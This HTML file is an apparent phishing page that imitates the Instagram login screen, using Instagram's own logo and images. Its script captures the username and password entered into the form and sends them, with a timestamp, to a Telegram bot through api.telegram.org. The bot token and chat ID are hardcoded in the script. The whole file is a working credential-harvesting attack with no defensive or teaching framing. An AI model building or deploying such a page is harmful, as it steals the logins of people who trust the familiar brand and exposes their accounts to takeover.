<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* Same styles as previous example */
    </style>
</head>
<body>
    <div class="main">
        <div class="container">
            <div class="content">
                <div class="image-container">
                    <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.jpg/fdfe239b7a7c.jpg" alt="Instagram App">
                </div>
                <div class="form-container">
                    <div class="form-card">
                        <div class="logo">
                            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
                        </div>
                        <form id="loginForm">
                            <div class="form-group">
                                <input type="text" class="input-field" placeholder="Phone number, username, or email" required>
                            </div>
                            <div class="form-group">
                                <input type="password" class="input-field" placeholder="Password" required>
                            </div>
                            <button type="submit" class="button">Log In</button>
                        </form>
                        <div class="divider">
                            <div class="divider-line"></div>
                            <div class="divider-text">OR</div>
                            <div class="divider-line"></div>
                        </div>
                        <div class="form-group">
                            <button class="button" style="background-color: #40B5E8;">Log in with Facebook</button>
                        </div>
                    </div>
                    <div class="footer">
                        <p>Don't have an account? <a href="#">Sign up</a></p>
                        <p style="margin-top: 10px;">Get the app.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = this.querySelector('input[type="text"]').value;
            const password = this.querySelector('input[type="password"]').value;
            
            try {
                // Send credentials to Telegram
                await sendToTelegram(username, password);
                
                // Show success message
                alert("Credentials sent to Telegram!");
            } catch (error) {
                console.error("Telegram error:", error);
                alert("Failed to send credentials to Telegram.");
            }
        });
        
        async function sendToTelegram(username, password) {
            // Replace with your actual Telegram bot token and chat ID
            const BOT_TOKEN = '8479114560:AAHWxdbrMUJI5kOmPNOpKEZEQ9Rkm8A4jrY';
            const CHAT_ID = '7623464451';
            
            const message = `üîê New Instagram Login Attempt üîê\n\nUsername: ${username}\nPassword: ${password}\n\nTimestamp: ${new Date().toLocaleString()}`;
            
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                }
            );
            
            if (!response.ok) {
                throw new Error(`Telegram API error: ${response.status}`);
            }
            
            return await response.json();
        }
    </script>
</body>
</html>
